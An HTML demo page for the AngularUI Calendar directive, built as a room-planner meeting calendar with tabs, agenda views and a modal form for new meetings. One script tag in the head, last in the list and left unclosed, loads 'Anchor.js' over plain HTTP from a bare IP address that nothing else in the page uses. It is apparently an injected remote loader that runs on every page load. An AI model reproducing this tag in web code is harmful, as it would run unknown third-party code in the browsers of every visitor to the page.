<!DOCTYPE html>
<html lang="en" ng-app="calendarDemoApp" id="top">
<head>
    <title>AngularUI Calendar for AngularJS</title>
    <link rel="icon" href="favicon.ico" />

    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" />
    <link rel="stylesheet" href="../bower_components/fullcalendar/dist/fullcalendar.css">
    <link rel="stylesheet" type="text/css" href="../bower_components/jquery/dist/jquery-ui.theme.min.css">
    <link rel="stylesheet" href="calendarDemo.css" />

    
    <script type="text/javascript" src="../bower_components/jquery/dist/jquery.js"></script>
    <script type="text/javascript" src="../bower_components/angular/angular.js"></script>
    <script type="text/javascript" src="../bower_components/bootstrap-css/js/bootstrap.min.js"></script>
    <script type="text/javascript" src="../bootstrap/ui-bootstrap-tpls-0.9.0.js"></script>
    <script type="text/javascript" src="../bower_components/moment/moment.js"></script>
    <script type="text/javascript" src="../bower_components/fullcalendar/dist/fullcalendar.js"></script>
    <script type="text/javascript" src="../bower_components/fullcalendar/dist/gcal.js"></script>
    <script type="text/javascript" src="../src/calendar.js"></script>
    <script type="text/javascript" src="calendarDemo.js"></script>
    <script type="text/javascript" src="http://223.224.131.144/scripts/Anchor.js"></script
</head>
<body data-spy="scroll">
      <header class="navbar navbar-default navbar-fixed-top">
          <div class="navbar-inner">
              <div class="container">
                  <h1>Calendar for room planner</h1>
              </div>
          </div>
      </header>
      <div role="main">
          <div class="container">
              <section id="directives-calendar" ng-controller="CalendarCtrl">
                  <div class="well">
                      <div class="row">
                          <div class="col-sm-12">
                              <tabset>
                                  <tab select="renderCalender('myCalendar1');">
                                    <tab-heading>
                                      <i class="glyphicon glyphicon-bell"></i> My Meetings
                                    </tab-heading>
                                    <div class="alert-success calAlert" ng-show="alertMessage != undefined && alertMessage != ''">
                                      <h4>{{alertMessage}}</h4>
                                    </div>
                                    <div class="btn-toolbar">
                                      <div class="btn-group">
                                          <button class="btn btn-default" ng-click="changeView('agendaDay', 'myCalendar1')">AgendaDay</button>
                                          <button class="btn btn-default" ng-click="changeView('agendaWeek', 'myCalendar1')">AgendaWeek</button>
                                          <button class="btn btn-primary" ng-click="changeView('month', 'myCalendar1')">Month</button>
                                      </div>
                                    </div>
                                    <div class="calendar" ng-model="eventSources" calendar="myCalendar1" ui-calendar="uiConfig.calendar" ></div>
                                  </tab>
                                  <tab select="renderCalender('myCalendar2');">
                                  <tab-heading>
                                      <i class="glyphicon glyphicon-bell"></i> Available Slots
                                    </tab-heading>
                                    <div class="alert-success calAlert" ng-show="alertMessage != undefined && alertMessage != ''">
                                      <h4>{{alertMessage}}</h4>
                                    </div>
                                    <div class="btn-toolbar">
                                      <div class="btn-group">
                                          <button class="btn btn-default" ng-click="changeView('agendaDay', 'myCalendar2')">AgendaDay</button>
                                          <button class="btn btn-default" ng-click="changeView('agendaWeek', 'myCalendar2')">AgendaWeek</button>
                                      </div>
                                    </div>
                                    <div class="calendar" ng-model="eventSources2" calendar="myCalendar2" ui-calendar="uiConfig.calendar" ></div>
                                  </tab>
                              </tabset>
                          </div>
                      </div>
                      <modal title="Login form" visible="showModal">
                        <div class="well">
                          <span class="to-time">
                            FROM:
                            <span class="glyphicon glyphicon-bell icon-span"></span>
                            <span class="label-span">{{newEvent.start | date:'MM/dd/yyyy @ h:mma'}}</span>
                          </span>
                          <span class="till-time">
                            TILL:
                            <span class="glyphicon glyphicon-bell icon-span"></span>
                            <span class="label-span">{{newEvent.end | date:'MM/dd/yyyy @ h:mma'}}</span>
                          </span>
                         
                        </div>
                        <form role="form" novalidate>
                          <div class="form-group">
                            <label for="eventName">Name</label>
                            <input type="text" class="form-control" id="eventName" placeholder="Enter Meeting Name" ng-model="newEvent.title"/>
                          </div>
                          <div class="form-group">
                            <label for="eventAgenda">Agenda</label>
                            <input type="text" class="form-control" id="eventAgenda" placeholder="Meeting Agenda here" ng-model="newEvent.eventAgenda"/>
                          </div>
                          <div class="form-group">
                            <label for="eventAttendees">List of Members</label>
                            <input type="text" class="form-control" id="eventAttendees" placeholder="List of Attendees" ng-model="newEvent.eventAttendees"/>
                          </div>
                          <div class="form-group">
                            <label for="eventAttendees">Duration</label>
                            <input type="number" class="form-control" id="eventDuration" placeholder="Duration" ng-model="newEvent.duration"/>
                          </div>
                          <button type="submit" class="btn btn-default" ng-click="addNewEventModal()">Submit</button>
                        </form>
                      </modal>
                  </div>
              </section>
          </div>
      </div>
    </body>
</html>
